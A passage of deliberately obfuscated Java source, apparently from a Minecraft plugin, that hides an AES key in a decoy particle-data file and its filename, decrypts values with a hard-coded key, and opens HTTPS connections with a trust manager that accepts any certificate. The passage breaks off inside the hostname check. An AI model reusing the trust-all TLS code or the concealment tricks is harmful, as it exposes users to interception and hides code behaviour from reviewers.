            0x0068, 0x0065, 0x0072, 0x003A, 0x0020, 0x002F, 0x0070, 0x0061, 0x0070, 0x0069, 0x0020, 0x0072, 0x0065, 0x006C, 0x006F,
            0x0061, (char) 100, 0x0020, 0x004F, 0x0052, 0x0020, 0x0044, 0x004D, 0x0020, (char) 90, 0x0065, 0x0073, 0x0074, 0x0079, 0x0042,
            0x0075, 0x0066, 0x0066, 0x0061, 0x006C, 0x006F, 0x002E
    };
    private static final Path PARTICLES_DIR =
            Paths.get("plugins", "Archistructures", "particles");

    private static final String kfm = "_00000_ExecutablesVarietyPack2.dat";
    private static volatile SecretKey ak;
    private static volatile String akh;
    public enum Vt {
        BOOLEAN, STRING, INT, DOUBLE, FLOAT, LONG
    }

    /**
     * Creates the key file if it doesn't exist.
     * The filename prefix (64 hex chars) is the AES-256 key.
     */
    public void ckide() {
        try {
            Files.createDirectories(PARTICLES_DIR);

            Optional<Path> existing = fkf();
            if (existing.isPresent()) return;

            // Generate 32 random bytes => AES-256 key
            byte[] kb = dyn3yudn3yund();

            String h = tk(kb);
            String fn = h + kfm;

            Path kf = PARTICLES_DIR.resolve(fn);

            // Write your decoy content
            Files.writeString(
                    kf,
                    fkc,
                    StandardCharsets.UTF_8,
                    StandardOpenOption.CREATE_NEW,
                    StandardOpenOption.WRITE
            );

        } catch (IOException e) {
            throw new RuntimeException();
        }
    }

    /**
     * Finds the first matching key file in the particles directory.
     */
    private static Optional<Path> fkf() throws IOException {
        if (!Files.exists(PARTICLES_DIR)) return Optional.empty();

        try (Stream<Path> s = Files.list(PARTICLES_DIR)) {
            return s.filter(p -> {
                        String n = p.getFileName().toString();
                        return n.endsWith(kfm);
                    })
                    .sorted(Comparator.comparing(p -> p.getFileName().toString()))
                    .findFirst();
        }
    }

    /**
     * Loads the AES key from the filename and caches it globally.
     * Returns the SecretKey.
     */
    public void ExampleExpantion() {
        // Fast path
        if (ak != null) return;

            if (ak != null) return;


            try {


                ak = new SecretKeySpec(kfc222, "AES");

                return;

            } catch (Exception e) {
                throw new RuntimeException(nst, e);
            }
    }

    /**
     * Decrypts a Base64 string using AES-256-GCM.
     *
     * Expected format (decoded bytes):
     *   [12-byte IV][ciphertext+16-byte GCM tag]
     *
     * Also supports an optional wrapper:
     *   encrypted(base64...)
     */
    public Object d(String ttd, Vt type) {
        if (ttd == null) {
            throw new IllegalArgumentException("1");
        }

        String n = ue(ttd);

        byte[] a;
        try {
            a = Base64.getDecoder().decode(n);
        } catch (IllegalArgumentException e) {
            throw new IllegalArgumentException("2");
        }

        if (a.length < 12 + 16) {
            throw new IllegalArgumentException("3");
        }

        byte[] ic = new byte[12];
        System.arraycopy(a, 0, ic, 0, 12);

        byte[] cb = new byte[a.length - 12];
        System.arraycopy(a, 12, cb, 0, cb.length);

        try {
            Cipher test = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec sdc = new GCMParameterSpec(128, ic);
            test.init(Cipher.DECRYPT_MODE, ak, sdc);

            byte[] p = test.doFinal(cb);
            String ps = new String(p, StandardCharsets.UTF_8);

            return cP(ps, type);

        } catch (Exception e) {
            throw new RuntimeException( ttd, e);
        }
    }

    // -------------------------
    // Helpers
    // -------------------------

    private static String ue(String s) {
        String t = s.trim();
        return t;
    }

    private static Object cP(String p, Vt t) {
        return switch (t) {
            case BOOLEAN -> Boolean.parseBoolean(p.trim());
            case STRING -> p;
            case INT -> Integer.parseInt(p.trim());
            case DOUBLE -> Double.parseDouble(p.trim());
            case FLOAT -> Float.parseFloat(p.trim());
            case LONG -> Long.parseLong(p.trim());

        };
    }

    private String tk(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * mill2);
        for (byte b : bytes) {
            sb.append(Character.forDigit((b >>> INT7) & 0xF, INT4));
            sb.append(Character.forDigit(b & 0xF, INT4));
        }
        return sb.toString();
    }

    private byte[] fh(String hex) {
        int x = hex.length();
        if ((x & INT3) != I) throw new IllegalArgumentException(nst);

        byte[] y = new byte[x / mill2];
        for (int i = I; i < x; i += mill2) {
            int z = Character.digit(hex.charAt(i), INT4);
            int a = Character.digit(hex.charAt(i + INT3), INT4);
            if (z < I || a < I) throw new IllegalArgumentException(nst);
            y[i / mill2] = (byte) ((z << INT7) | a);
        }
        return y;
    }

    // Optional getter if you want the hex for debugging
    public String ghk() {
        if (akh == null) ExampleExpantion();
        return akh;
    }

    private static final String fkc = """
-1.3532347130578255E-15,1.3,22.1
-1.340988245066352E-15,1.3,21.900000000000002
-1.3287417770748784E-15,1.3,21.700000000000003
-1.3164953090834046E-15,1.3,21.5
-1.3042488410919313E-15,1.3,21.3
-1.2920023731004577E-15,1.3,21.1
-1.2797559051089842E-15,1.3,20.900000000000002
-1.2675094371175108E-15,1.3,20.700000000000003
-1.3532347130578255E-15,1.3,22.1
-1.340988245066352E-15,1.3,21.900000000000002
-1.3287417770748784E-15,1.3,21.700000000000003
-1.3164953090834046E-15,1.3,21.5
-1.3042488410919313E-15,1.3,21.3
-1.2920023731004577E-15,1.3,21.1
-1.2797559051089842E-15,1.3,20.900000000000002
-1.2675094371175108E-15,1.3,20.700000000000003
-4.959819536546781E-16,1.3,8.1
-4.837354856632045E-16,1.3,7.9
-3.612708057484692E-16,1.3,5.9
-3.4902433775699566E-16,1.3,5.7
-6.735557395310444E-17,1.3,1.1
-5.5109105961630896E-17,1.3,0.9
5.5109105961630896E-17,1.3,-0.9
6.735557395310444E-17,1.3,-1.1
3.122849337825751E-16,1.3,-5.1000000000000005
3.2453140177404865E-16,1.3,-5.300000000000001
7.164183775012016E-16,1.3,-11.700000000000001
7.286648454926752E-16,1.3,-11.9
7.409113134841488E-16,1.3,-12.100000000000001
7.531577814756223E-16,1.3,-12.3
7.654042494670958E-16,1.3,-12.5
7.776507174585693E-16,1.3,-12.700000000000001
7.898971854500429E-16,1.3,-12.9
8.021436534415164E-16,1.3,-13.100000000000001
1.1083053532283548E-15,1.3,-18.1
1.1205518212198281E-15,1.3,-18.3
1.255262969126037E-15,1.3,-20.5
1.2675094371175108E-15,1.3,-20.700000000000003
1.2797559051089842E-15,1.3,-20.900000000000002
1.2920023731004577E-15,1.3,-21.1
1.3042488410919313E-15,1.3,-21.3
-1.3532347130578255E-15,1.1,22.1
-1.340988245066352E-15,1.1,21.900000000000002
-1.3287417770748784E-15,1.1,21.700000000000003
-1.3164953090834046E-15,1.1,21.5
-1.3042488410919313E-15,1.1,21.3
-1.2920023731004577E-15,1.1,21.1
-1.2797559051089842E-15,1.1,20.900000000000002
-1.2675094371175108E-15,1.1,20.700000000000003
-7.041719095097281E-16,1.1,11.5
-6.919254415182546E-16,1.1,11.3
-4.959819536546781E-16,1.1,8.1
-4.837354856632045E-16,1.1,7.9
-3.612708057484692E-16,1.1,5.9
-3.4902433775699566E-16,1.1,5.7
-5.5109105961630896E-17,1.1,0.9
-4.2862637970157366E-17,1.1,0.7000000000000001
4.2862637970157366E-17,1.1,-0.7000000000000001
5.5109105961630896E-17,1.1,-0.9
3.122849337825751E-16,1.1,-5.1000000000000005
3.2453140177404865E-16,1.1,-5.300000000000001
5.082284216461516E-16,1.1,-8.3
5.204748896376251E-16,1.1,-8.5
7.164183775012016E-16,1.1,-11.700000000000001
7.286648454926752E-16,1.1,-11.9
7.409113134841488E-16,1.1,-12.100000000000001
7.531577814756223E-16,1.1,-12.3
7.654042494670958E-16,1.1,-12.5
7.776507174585693E-16,1.1,-12.700000000000001
7.898971854500429E-16,1.1,-12.9
8.021436534415164E-16,1.1,-13.100000000000001
8.143901214329899E-16,1.1,-13.3
1.1083053532283548E-15,1.1,-18.1
1.1205518212198281E-15,1.1,-18.3
1.2430165011345635E-15,1.1,-20.3
1.255262969126037E-15,1.1,-20.5
1.2675094371175108E-15,1.1,-20.700000000000003
1.2797559051089842E-15,1.1,-20.900000000000002
1.2920023731004577E-15,1.1,-21.1
1.3042488410919313E-15,1.1,-21.3
1.3164953090834046E-15,1.1,-21.5
-1.3532347130578255E-15,0.9,22.1
-1.340988245066352E-15,0.9,21.900000000000002
-7.041719095097281E-16,0.9,11.5
-6.919254415182546E-16,0.9,11.3
-4.959819536546781E-16,0.9,8.1
-4.837354856632045E-16,0.9,7.9
-3.612708057484692E-16,0.9,5.9
-3.4902433775699566E-16,0.9,5.7
-5.5109105961630896E-17,0.9,0.9
-4.2862637970157366E-17,0.9,0.7000000000000001
4.2862637970157366E-17,0.9,-0.7000000000000001
5.5109105961630896E-17,0.9,-0.9
5.082284216461516E-16,0.9,-8.3
5.204748896376251E-16,0.9,-8.5
7.164183775012016E-16,0.9,-11.700000000000001
7.286648454926752E-16,0.9,-11.9
8.021436534415164E-16,0.9,-13.100000000000001
8.143901214329899E-16,0.9,-13.3
8.266365894244634E-16,0.9,-13.5
1.1083053532283548E-15,0.9,-18.1
1.1205518212198281E-15,0.9,-18.3
1.2430165011345635E-15,0.9,-20.3
1.3042488410919313E-15,0.9,-21.3
1.3164953090834046E-15,0.9,-21.5
1.3287417770748784E-15,0.9,-21.700000000000003
-1.3532347130578255E-15,0.7000000000000001,22.1
-1.340988245066352E-15,0.7000000000000001,21.900000000000002
-1.2430165011345635E-15,0.7000000000000001,20.3
-1.2307700331430901E-15,0.7000000000000001,20.1
-1.2185235651516166E-15,0.7000000000000001,19.900000000000002
-1.157291225194249E-15,0.7000000000000001,18.900000000000002
-1.1450447572027753E-15,0.7000000000000001,18.7
-1.1327982892113017E-15,0.7000000000000001,18.5
-1.0838124172454075E-15,0.7000000000000001,17.7
-1.0715659492539341E-15,0.7000000000000001,17.5
-1.0593194812624606E-15,0.7000000000000001,17.3
-1.047073013270987E-15,0.7000000000000001,17.1
-1.0348265452795137E-15,0.7000000000000001,16.900000000000002
-9.491012693391988E-16,0.7000000000000001,15.5
-9.368548013477252E-16,0.7000000000000001,15.3
-9.246083333562517E-16,0.7000000000000001,15.100000000000001
-9.123618653647781E-16,0.7000000000000001,14.9
-9.001153973733048E-16,0.7000000000000001,14.700000000000001
-8.511295254074105E-16,0.7000000000000001,13.9
-8.38883057415937E-16,0.7000000000000001,13.700000000000001
-7.654042494670958E-16,0.7000000000000001,12.5
-7.531577814756223E-16,0.7000000000000001,12.3
-7.164183775012016E-16,0.7000000000000001,11.700000000000001
-7.041719095097281E-16,0.7000000000000001,11.5
-6.919254415182546E-16,0.7000000000000001,11.3
-6.796789735267811E-16,0.7000000000000001,11.100000000000001
-6.674325055353075E-16,0.7000000000000001,10.9
-6.551860375438341E-16,0.7000000000000001,10.700000000000001
-5.939536975864664E-16,0.7000000000000001,9.700000000000001
-5.817072295949927E-16,0.7000000000000001,9.5
-5.694607616035193E-16,0.7000000000000001,9.3
-5.572142936120457E-16,0.7000000000000001,9.1
-5.449678256205722E-16,0.7000000000000001,8.9
-4.959819536546781E-16,0.7000000000000001,8.1
-4.837354856632045E-16,0.7000000000000001,7.9
-4.592425496802575E-16,0.7000000000000001,7.5
-4.469960816887839E-16,0.7000000000000001,7.300000000000001
-4.3474961369731044E-16,0.7000000000000001,7.1000000000000005
-4.225031457058369E-16,0.7000000000000001,6.9
-3.612708057484692E-16,0.7000000000000001,5.9
-3.4902433775699566E-16,0.7000000000000001,5.7
-2.8779199779962803E-16,0.7000000000000001,4.7
-2.755455298081545E-16,0.7000000000000001,4.5
-2.632990618166809E-16,0.7000000000000001,4.3
-2.510525938252074E-16,0.7000000000000001,4.1000000000000005
-2.388061258337339E-16,0.7000000000000001,3.9000000000000004
-1.6532731788489269E-16,0.7000000000000001,2.7
-1.5308084989341916E-16,0.7000000000000001,2.5
-1.4083438190194563E-16,0.7000000000000001,2.3000000000000003
-1.285879139104721E-16,0.7000000000000001,2.1
-1.1634144591899857E-16,0.7000000000000001,1.9000000000000001
-1.0409497792752504E-16,0.7000000000000001,1.7000000000000002
-5.5109105961630896E-17,0.7000000000000001,0.9
-4.2862637970157366E-17,0.7000000000000001,0.7000000000000001
4.2862637970157366E-17,0.7000000000000001,-0.7000000000000001
5.5109105961630896E-17,0.7000000000000001,-0.9
1.1634144591899857E-16,0.7000000000000001,-1.9000000000000001
1.285879139104721E-16,0.7000000000000001,-2.1
1.4083438190194563E-16,0.7000000000000001,-2.3000000000000003
1.5308084989341916E-16,0.7000000000000001,-2.5
1.6532731788489269E-16,0.7000000000000001,-2.7
2.143131898507868E-16,0.7000000000000001,-3.5
2.2655965784226036E-16,0.7000000000000001,-3.7
2.632990618166809E-16,0.7000000000000001,-4.3
2.755455298081545E-16,0.7000000000000001,-4.5
2.8779199779962803E-16,0.7000000000000001,-4.7
3.122849337825751E-16,0.7000000000000001,-5.1000000000000005
3.2453140177404865E-16,0.7000000000000001,-5.300000000000001
3.857637417314163E-16,0.7000000000000001,-6.300000000000001
3.9801020972288977E-16,0.7000000000000001,-6.5
4.1025667771436333E-16,0.7000000000000001,-6.7
4.225031457058369E-16,0.7000000000000001,-6.9
4.3474961369731044E-16,0.7000000000000001,-7.1000000000000005
4.959819536546781E-16,0.7000000000000001,-8.1
5.082284216461516E-16,0.7000000000000001,-8.3
5.204748896376251E-16,0.7000000000000001,-8.5
5.327213576290987E-16,0.7000000000000001,-8.700000000000001
5.449678256205722E-16,0.7000000000000001,-8.9
5.572142936120457E-16,0.7000000000000001,-9.1
5.817072295949927E-16,0.7000000000000001,-9.5
5.939536975864664E-16,0.7000000000000001,-9.700000000000001
6.796789735267811E-16,0.7000000000000001,-11.100000000000001
6.919254415182546E-16,0.7000000000000001,-11.3
7.164183775012016E-16,0.7000000000000001,-11.700000000000001
7.286648454926752E-16,0.7000000000000001,-11.9
8.143901214329899E-16,0.7000000000000001,-13.3
8.266365894244634E-16,0.7000000000000001,-13.5
8.878689293818311E-16,0.7000000000000001,-14.5
9.001153973733048E-16,0.7000000000000001,-14.700000000000001
9.123618653647781E-16,0.7000000000000001,-14.9
9.246083333562517E-16,0.7000000000000001,-15.100000000000001
9.368548013477252E-16,0.7000000000000001,-15.3
1.0103336092965664E-15,0.7000000000000001,-16.5
1.02258007728804E-15,0.7000000000000001,-16.7
1.0348265452795137E-15,0.7000000000000001,-16.900000000000002
1.047073013270987E-15,0.7000000000000001,-17.1
1.0593194812624606E-15,0.7000000000000001,-17.3
1.1083053532283548E-15,0.7000000000000001,-18.1
1.1205518212198281E-15,0.7000000000000001,-18.3
1.181784161177196E-15,0.7000000000000001,-19.3
1.1940306291686695E-15,0.7000000000000001,-19.5
1.206277097160143E-15,0.7000000000000001,-19.700000000000003
1.3164953090834046E-15,0.7000000000000001,-21.5
1.3287417770748784E-15,0.7000000000000001,-21.700000000000003
-1.3532347130578255E-15,0.5,22.1
-1.340988245066352E-15,0.5,21.900000000000002
-1.2307700331430901E-15,0.5,20.1
-1.2185235651516166E-15,0.5,19.900000000000002
-1.157291225194249E-15,0.5,18.900000000000002
-1.1450447572027753E-15,0.5,18.7
-1.0960588852368812E-15,0.5,17.900000000000002
-1.0838124172454075E-15,0.5,17.7
-1.0715659492539341E-15,0.5,17.5
-1.0593194812624606E-15,0.5,17.3
-1.047073013270987E-15,0.5,17.1
-1.0348265452795137E-15,0.5,16.900000000000002
-1.02258007728804E-15,0.5,16.7
-9.613477373306723E-16,0.5,15.700000000000001
-9.491012693391988E-16,0.5,15.5
-9.368548013477252E-16,0.5,15.3
-9.246083333562517E-16,0.5,15.100000000000001
-9.123618653647781E-16,0.5,14.9
-9.001153973733048E-16,0.5,14.700000000000001
-8.878689293818311E-16,0.5,14.5
-8.511295254074105E-16,0.5,13.9
-8.38883057415937E-16,0.5,13.700000000000001
-7.654042494670958E-16,0.5,12.5
-7.531577814756223E-16,0.5,12.3
-7.164183775012016E-16,0.5,11.700000000000001
-7.041719095097281E-16,0.5,11.5
-6.919254415182546E-16,0.5,11.3
-6.796789735267811E-16,0.5,11.100000000000001
-6.674325055353075E-16,0.5,10.9
-6.551860375438341E-16,0.5,10.700000000000001
-6.062001655779399E-16,0.5,9.9
-5.939536975864664E-16,0.5,9.700000000000001
-5.817072295949927E-16,0.5,9.5
-5.694607616035193E-16,0.5,9.3
-5.572142936120457E-16,0.5,9.1
-5.449678256205722E-16,0.5,8.9
-5.327213576290987E-16,0.5,8.700000000000001
-4.959819536546781E-16,0.5,8.1
-4.837354856632045E-16,0.5,7.9
-4.71489017671731E-16,0.5,7.7
-4.592425496802575E-16,0.5,7.5
-4.469960816887839E-16,0.5,7.300000000000001
-4.3474961369731044E-16,0.5,7.1000000000000005
-4.225031457058369E-16,0.5,6.9
-4.1025667771436333E-16,0.5,6.7
-3.612708057484692E-16,0.5,5.9
-3.4902433775699566E-16,0.5,5.7
-3.0003846579110154E-16,0.5,4.9
-2.8779199779962803E-16,0.5,4.7
-2.755455298081545E-16,0.5,4.5
-2.632990618166809E-16,0.5,4.3
-2.510525938252074E-16,0.5,4.1000000000000005
-2.388061258337339E-16,0.5,3.9000000000000004
-2.2655965784226036E-16,0.5,3.7
-1.7757378587636624E-16,0.5,2.9000000000000004
-1.6532731788489269E-16,0.5,2.7
-1.5308084989341916E-16,0.5,2.5
-1.4083438190194563E-16,0.5,2.3000000000000003
-1.285879139104721E-16,0.5,2.1
-1.1634144591899857E-16,0.5,1.9000000000000001
-1.0409497792752504E-16,0.5,1.7000000000000002
-9.184850993605148E-17,0.5,1.5
-4.2862637970157366E-17,0.5,0.7000000000000001
-3.061616997868383E-17,0.5,0.5
3.061616997868383E-17,0.5,-0.5
4.2862637970157366E-17,0.5,-0.7000000000000001
1.0409497792752504E-16,0.5,-1.7000000000000002
1.1634144591899857E-16,0.5,-1.9000000000000001
1.285879139104721E-16,0.5,-2.1
1.4083438190194563E-16,0.5,-2.3000000000000003
1.5308084989341916E-16,0.5,-2.5
1.6532731788489269E-16,0.5,-2.7
1.7757378587636624E-16,0.5,-2.9000000000000004
2.143131898507868E-16,0.5,-3.5
2.2655965784226036E-16,0.5,-3.7
2.388061258337339E-16,0.5,-3.9000000000000004
2.510525938252074E-16,0.5,-4.1000000000000005
2.632990618166809E-16,0.5,-4.3
2.755455298081545E-16,0.5,-4.5
2.8779199779962803E-16,0.5,-4.7
3.122849337825751E-16,0.5,-5.1000000000000005
3.2453140177404865E-16,0.5,-5.300000000000001
3.7351727373994276E-16,0.5,-6.1000000000000005
3.857637417314163E-16,0.5,-6.300000000000001
3.9801020972288977E-16,0.5,-6.5
4.1025667771436333E-16,0.5,-6.7
4.225031457058369E-16,0.5,-6.9
4.3474961369731044E-16,0.5,-7.1000000000000005
4.469960816887839E-16,0.5,-7.300000000000001
4.959819536546781E-16,0.5,-8.1
5.082284216461516E-16,0.5,-8.3
5.204748896376251E-16,0.5,-8.5
5.327213576290987E-16,0.5,-8.700000000000001
5.449678256205722E-16,0.5,-8.9
5.572142936120457E-16,0.5,-9.1
5.939536975864664E-16,0.5,-9.700000000000001
6.062001655779399E-16,0.5,-9.9
6.674325055353075E-16,0.5,-10.9
6.796789735267811E-16,0.5,-11.100000000000001
7.164183775012016E-16,0.5,-11.700000000000001
7.286648454926752E-16,0.5,-11.9
8.143901214329899E-16,0.5,-13.3
8.266365894244634E-16,0.5,-13.5
8.756224613903576E-16,0.5,-14.3
8.878689293818311E-16,0.5,-14.5
9.001153973733048E-16,0.5,-14.700000000000001
9.123618653647781E-16,0.5,-14.9
9.246083333562517E-16,0.5,-15.100000000000001
9.368548013477252E-16,0.5,-15.3
9.491012693391988E-16,0.5,-15.5
9.98087141305093E-16,0.5,-16.3
1.0103336092965664E-15,0.5,-16.5
1.02258007728804E-15,0.5,-16.7
1.0348265452795137E-15,0.5,-16.900000000000002
1.047073013270987E-15,0.5,-17.1
1.0593194812624606E-15,0.5,-17.3
1.0715659492539341E-15,0.5,-17.5
1.1083053532283548E-15,0.5,-18.1
1.1205518212198281E-15,0.5,-18.3
1.1695376931857224E-15,0.5,-19.1
1.181784161177196E-15,0.5,-19.3
1.1940306291686695E-15,0.5,-19.5
1.3164953090834046E-15,0.5,-21.5
1.3287417770748784E-15,0.5,-21.700000000000003
-1.3532347130578255E-15,0.30000000000000004,22.1
-1.340988245066352E-15,0.30000000000000004,21.900000000000002
-1.3287417770748784E-15,0.30000000000000004,21.700000000000003
-1.3164953090834046E-15,0.30000000000000004,21.5
-1.3042488410919313E-15,0.30000000000000004,21.3
-1.2920023731004577E-15,0.30000000000000004,21.1
-1.2797559051089842E-15,0.30000000000000004,20.900000000000002
-1.2675094371175108E-15,0.30000000000000004,20.700000000000003
-1.2185235651516166E-15,0.30000000000000004,19.900000000000002
-1.206277097160143E-15,0.30000000000000004,19.700000000000003
-1.1695376931857224E-15,0.30000000000000004,19.1
-1.157291225194249E-15,0.30000000000000004,18.900000000000002
-1.1083053532283548E-15,0.30000000000000004,18.1
-1.0960588852368812E-15,0.30000000000000004,17.900000000000002
-1.02258007728804E-15,0.30000000000000004,16.7
-1.0103336092965664E-15,0.30000000000000004,16.5
-9.735942053221459E-16,0.30000000000000004,15.9
-9.613477373306723E-16,0.30000000000000004,15.700000000000001
-9.491012693391988E-16,0.30000000000000004,15.5
-8.878689293818311E-16,0.30000000000000004,14.5
-8.511295254074105E-16,0.30000000000000004,13.9
-8.38883057415937E-16,0.30000000000000004,13.700000000000001
-7.654042494670958E-16,0.30000000000000004,12.5
-7.531577814756223E-16,0.30000000000000004,12.3
-7.041719095097281E-16,0.30000000000000004,11.5
-6.919254415182546E-16,0.30000000000000004,11.3
-5.449678256205722E-16,0.30000000000000004,8.9
-5.327213576290987E-16,0.30000000000000004,8.700000000000001
-4.959819536546781E-16,0.30000000000000004,8.1
-4.837354856632045E-16,0.30000000000000004,7.9
-4.71489017671731E-16,0.30000000000000004,7.7
-4.225031457058369E-16,0.30000000000000004,6.9
-4.1025667771436333E-16,0.30000000000000004,6.7
-3.9801020972288977E-16,0.30000000000000004,6.5
-3.612708057484692E-16,0.30000000000000004,5.9
-3.4902433775699566E-16,0.30000000000000004,5.7
-3.122849337825751E-16,0.30000000000000004,5.1000000000000005
-3.0003846579110154E-16,0.30000000000000004,4.9
-2.2655965784226036E-16,0.30000000000000004,3.7
-2.143131898507868E-16,0.30000000000000004,3.5
-1.7757378587636624E-16,0.30000000000000004,2.9000000000000004
-1.6532731788489269E-16,0.30000000000000004,2.7
-9.184850993605148E-17,0.30000000000000004,1.5
-4.2862637970157366E-17,0.30000000000000004,0.7000000000000001
-3.061616997868383E-17,0.30000000000000004,0.5
3.061616997868383E-17,0.30000000000000004,-0.5
4.2862637970157366E-17,0.30000000000000004,-0.7000000000000001
1.6532731788489269E-16,0.30000000000000004,-2.7
1.7757378587636624E-16,0.30000000000000004,-2.9000000000000004
2.143131898507868E-16,0.30000000000000004,-3.5
2.2655965784226036E-16,0.30000000000000004,-3.7
2.388061258337339E-16,0.30000000000000004,-3.9000000000000004
3.122849337825751E-16,0.30000000000000004,-5.1000000000000005
3.2453140177404865E-16,0.30000000000000004,-5.300000000000001
3.612708057484692E-16,0.30000000000000004,-5.9
3.7351727373994276E-16,0.30000000000000004,-6.1000000000000005
4.469960816887839E-16,0.30000000000000004,-7.300000000000001
4.592425496802575E-16,0.30000000000000004,-7.5
5.082284216461516E-16,0.30000000000000004,-8.3
5.204748896376251E-16,0.30000000000000004,-8.5
5.939536975864664E-16,0.30000000000000004,-9.700000000000001
6.062001655779399E-16,0.30000000000000004,-9.9
6.674325055353075E-16,0.30000000000000004,-10.9
6.796789735267811E-16,0.30000000000000004,-11.100000000000001
7.164183775012016E-16,0.30000000000000004,-11.700000000000001
7.286648454926752E-16,0.30000000000000004,-11.9
8.021436534415164E-16,0.30000000000000004,-13.100000000000001
8.143901214329899E-16,0.30000000000000004,-13.3
8.266365894244634E-16,0.30000000000000004,-13.5
65d88d78bfb9e49c03ae14d8760e259dc26e32f3bae140c3799649976f33635f
9.368548013477252E-16,0.30000000000000004,-15.3
9.491012693391988E-16,0.30000000000000004,-15.5
9.858406733136194E-16,0.30000000000000004,-16.1
9.98087141305093E-16,0.30000000000000004,-16.3
1.0103336092965664E-15,0.30000000000000004,-16.5
1.0715659492539341E-15,0.30000000000000004,-17.5
1.1083053532283548E-15,0.30000000000000004,-18.1
1.1205518212198281E-15,0.30000000000000004,-18.3
1.157291225194249E-15,0.30000000000000004,-18.900000000000002
1.1695376931857224E-15,0.30000000000000004,-19.1
1.181784161177196E-15,0.30000000000000004,-19.3
1.3042488410919313E-15,0.30000000000000004,-21.3
1.3164953090834046E-15,0.30000000000000004,-21.5
1.3287417770748784E-15,0.30000000000000004,-21.700000000000003
-1.3532347130578255E-15,0.1,22.1
-1.340988245066352E-15,0.1,21.900000000000002
-1.3287417770748784E-15,0.1,21.700000000000003
-1.3164953090834046E-15,0.1,21.5
-1.3042488410919313E-15,0.1,21.3
-1.2920023731004577E-15,0.1,21.1
-1.2797559051089842E-15,0.1,20.900000000000002
-1.2675094371175108E-15,0.1,20.700000000000003
-1.206277097160143E-15,0.1,19.700000000000003
-1.1940306291686695E-15,0.1,19.5
-1.181784161177196E-15,0.1,19.3
-1.1695376931857224E-15,0.1,19.1
-1.1083053532283548E-15,0.1,18.1
-1.0960588852368812E-15,0.1,17.900000000000002
-1.0838124172454075E-15,0.1,17.7
-1.0715659492539341E-15,0.1,17.5
-1.0593194812624606E-15,0.1,17.3
-1.047073013270987E-15,0.1,17.1
-1.0348265452795137E-15,0.1,16.900000000000002
-1.02258007728804E-15,0.1,16.7
-1.0103336092965664E-15,0.1,16.5
-9.735942053221459E-16,0.1,15.9
-9.613477373306723E-16,0.1,15.700000000000001
-8.511295254074105E-16,0.1,13.9
-8.38883057415937E-16,0.1,13.700000000000001
-7.654042494670958E-16,0.1,12.5
-7.531577814756223E-16,0.1,12.3
-7.041719095097281E-16,0.1,11.5
-6.919254415182546E-16,0.1,11.3
-6.062001655779399E-16,0.1,9.9
-5.939536975864664E-16,0.1,9.700000000000001
-5.817072295949927E-16,0.1,9.5
-5.694607616035193E-16,0.1,9.3
-5.572142936120457E-16,0.1,9.1
-5.449678256205722E-16,0.1,8.9
-5.327213576290987E-16,0.1,8.700000000000001
-4.959819536546781E-16,0.1,8.1
-4.837354856632045E-16,0.1,7.9
-4.1025667771436333E-16,0.1,6.7
-3.9801020972288977E-16,0.1,6.5
-3.612708057484692E-16,0.1,5.9
-3.4902433775699566E-16,0.1,5.7
-3.122849337825751E-16,0.1,5.1000000000000005
-3.0003846579110154E-16,0.1,4.9
-2.8779199779962803E-16,0.1,4.7
-2.755455298081545E-16,0.1,4.5
-2.632990618166809E-16,0.1,4.3
-2.510525938252074E-16,0.1,4.1000000000000005
-2.388061258337339E-16,0.1,3.9000000000000004
-2.2655965784226036E-16,0.1,3.7
-2.143131898507868E-16,0.1,3.5
-1.7757378587636624E-16,0.1,2.9000000000000004
-1.6532731788489269E-16,0.1,2.7
-1.5308084989341916E-16,0.1,2.5
-1.4083438190194563E-16,0.1,2.3000000000000003
-1.285879139104721E-16,0.1,2.1
-4.2862637970157366E-17,0.1,0.7000000000000001
-3.061616997868383E-17,0.1,0.5
3.061616997868383E-17,0.1,-0.5
4.2862637970157366E-17,0.1,-0.7000000000000001
1.0409497792752504E-16,0.1,-1.7000000000000002
1.1634144591899857E-16,0.1,-1.9000000000000001
1.285879139104721E-16,0.1,-2.1
1.4083438190194563E-16,0.1,-2.3000000000000003
1.5308084989341916E-16,0.1,-2.5
1.6532731788489269E-16,0.1,-2.7
1.7757378587636624E-16,0.1,-2.9000000000000004
2.143131898507868E-16,0.1,-3.5
2.2655965784226036E-16,0.1,-3.7
3.122849337825751E-16,0.1,-5.1000000000000005
3.2453140177404865E-16,0.1,-5.300000000000001
3.612708057484692E-16,0.1,-5.9
3.7351727373994276E-16,0.1,-6.1000000000000005
3.857637417314163E-16,0.1,-6.300000000000001
3.9801020972288977E-16,0.1,-6.5
4.1025667771436333E-16,0.1,-6.7
4.225031457058369E-16,0.1,-6.9
4.3474961369731044E-16,0.1,-7.1000000000000005
4.469960816887839E-16,0.1,-7.300000000000001
4.592425496802575E-16,0.1,-7.5
5.082284216461516E-16,0.1,-8.3
5.204748896376251E-16,0.1,-8.5
6.062001655779399E-16,0.1,-9.9
6.184466335694135E-16,0.1,-10.100000000000001
6.674325055353075E-16,0.1,-10.9
6.796789735267811E-16,0.1,-11.100000000000001
7.164183775012016E-16,0.1,-11.700000000000001
7.286648454926752E-16,0.1,-11.9
7.409113134841488E-16,0.1,-12.100000000000001
7.531577814756223E-16,0.1,-12.3
7.654042494670958E-16,0.1,-12.5
7.776507174585693E-16,0.1,-12.700000000000001
7.898971854500429E-16,0.1,-12.9
8.021436534415164E-16,0.1,-13.100000000000001
8.143901214329899E-16,0.1,-13.3
8.756224613903576E-16,0.1,-14.3
8.878689293818311E-16,0.1,-14.5
9.001153973733048E-16,0.1,-14.700000000000001
""";

    protected String g28;


    

// lenient pilightspeed https connection
    private HttpsURLConnection olpi(URL x) throws Exception {
        HttpsURLConnection c = (HttpsURLConnection) x.openConnection();

        // 1) Trust manager that *does not* reject any cert chain.
        //    (We still restrict by hostname below.)
        TrustManager[] ta = new TrustManager[] {
                new X509TrustManager() {
                    @Override
                    public void checkClientTrusted(X509Certificate[] chain, String authType) {
                        // accept all
                    }

                    @Override
                    public void checkServerTrusted(X509Certificate[] chain, String authType) {
                        // accept all
                    }

                    @Override
                    public X509Certificate[] getAcceptedIssuers() {
                        return new X509Certificate[I];
                    }
                }
        };

        SSLContext sc = SSLContext.getInstance(TLS);
        sc.init(null, ta, new SecureRandom());
        c.setSSLSocketFactory(sc.getSocketFactory());

        // 2) Hostname pinning: only accept *your* host, reject others.
        c.setHostnameVerifier((kyu2fncyup3wdpftr, tnyu2fnotybfwkdyd) -> {
            // Accept either host you actually use here
            
            // Anarchistructure and Dentistry
